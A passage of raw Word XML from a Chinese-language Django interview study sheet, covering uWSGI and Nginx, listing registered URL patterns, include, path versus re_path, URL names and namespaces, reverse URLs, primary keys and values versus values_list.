          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> uWSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是实现</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> uwsgi </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议和</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器。</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">uWSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>具有超快的性能、低内存占用和多</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> app </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>管理等优点，并且搭配着</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nginx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE5AF6F" w14:textId="7616ABCC" w:rsidR="005D1318" w:rsidRPr="005D1318" w:rsidRDefault="005D1318" w:rsidP="005D1318">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就是一个生产环境了，能够将用户访问请求与应用</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> app </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>隔离开，实现真正的部署</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。相比来讲，支持的并发量更高，方便管理多进程，发挥多核的优势，提升性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133AE263" w14:textId="398E1FCB"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19" w:name="t29"/>
      <w:bookmarkStart w:id="20" w:name="t30"/>
      <w:bookmarkStart w:id="21" w:name="t31"/>
      <w:bookmarkEnd w:id="19"/>
      <w:bookmarkEnd w:id="20"/>
      <w:bookmarkEnd w:id="21"/>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40</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如何获取</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django urlpatterns</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里面注册的所有</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550BBE6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from django.conf.urls import url,include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E94C92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from arya.service.sites import site</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF6363C"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from django.urls.resolvers import RegexURLPattern</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8B7DCE"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from django.urls.resolvers import RegexURLResolver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6611C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from django.shortcuts import HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC556F0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A505E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def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADFA0FE"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print(get_all_url(urlpatterns,prev='/'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00300DB7"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return HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8AC600"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDAC166"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def get_all_url(urlparrentens,prev,is_first=False,result=[]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3A2E49"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if is_first:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660E8441"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result.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F4945E"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for item in urlparrentens:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22ECC36D"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v = item._regex.strip('^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7011E7F0"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if isinstance(item,RegexURLPattern):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FBDCFE"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result.append(prev + v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E59F163"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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8E3934"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get_all_url(item.urlconf_name,prev + v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3582B7"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return result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E48605"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F611A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lastRenderedPageBreak/>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190F46F4"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url(r'^arya/', site.urls),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A21B39D"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url(r'^index/', index),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F477FB"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32ABD265" w14:textId="78E9BC97" w:rsidR="006B2B80" w:rsidRDefault="008721E6" w:rsidP="003A7EFD">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="t32"/>
      <w:bookmarkEnd w:id="22"/>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41</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路由系统中</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>include</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是干嘛用的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B32A10"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include路由转发</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>通常，我们会在每个app里，各自创建一个urls.py路由模块，然后从根路由出发，将app所属的url请求，全部转发到相应的urls.py模块中。</w:t>
      </w:r>
      <w:bookmarkStart w:id="23" w:name="_label33"/>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="68615238" w14:textId="220C6643"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24" w:name="t33"/>
      <w:bookmarkEnd w:id="24"/>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42</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django2.0</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django1.xx</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里面的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>有什么区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789C2733"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2.0内的path匹配正则时候无效，导入re_path即可匹配正则         url = re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1998CF35"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url()        是</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django.urls.re_path()别名       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1651EB83"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url(regex, view, kwargs=None, name=None)[source]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC4D076"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This function is an alias to django.urls.re_path(). It's likely to be deprecated in a future release.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7E30D6" w14:textId="4C9C4C73"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25" w:name="t34"/>
      <w:bookmarkEnd w:id="25"/>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43</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urlpatterns</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>namespace</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>有什么作用？你是如何使用的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DB61F5" w14:textId="77777777" w:rsidR="00EF28F6" w:rsidRPr="00F532EB" w:rsidRDefault="00EF28F6"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name:别名，给路由起一个别名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AFC4C7" w14:textId="4549C779" w:rsidR="006B2B80" w:rsidRPr="00F532EB" w:rsidRDefault="00EF28F6"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namespace:名称空间，防止多个路由之间的路由重复。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671D006D" w14:textId="423837E8"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44</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如何根据</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>urlpatterns</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>反向生成</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url,</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>这样反向生成</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的方式有几种？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA6326F"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使用HttpResponseRedirect redirect和reverse 状态码：302,301</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C39E19" w14:textId="10FE6E21" w:rsidR="003A7EFD"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45</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如何给一个字段设置一个主键？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E9A830" w14:textId="01C5A124" w:rsidR="006B2B80" w:rsidRPr="00467BDF" w:rsidRDefault="006B2B80" w:rsidP="00467BDF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E60771" w14:textId="6B66A2B6"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26" w:name="t36"/>
      <w:bookmarkEnd w:id="26"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>04</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</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如何设置一个带有枚举值的字典？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B830E6" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="006B2B80">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1F1997D2" wp14:editId="33E21959">
            <wp:extent cx="5731510" cy="32315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2350" cy="3231967"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="27" w:name="_label37"/>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="402E91C9" w14:textId="6FF9728E"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28" w:name="t37"/>
      <w:bookmarkStart w:id="29" w:name="t38"/>
      <w:bookmarkEnd w:id="28"/>
      <w:bookmarkEnd w:id="29"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>04</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</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values()</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>values_list()</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>有什么区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559BA6C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xml:space="preserve">#values : </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>取字典的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
    </w:p>
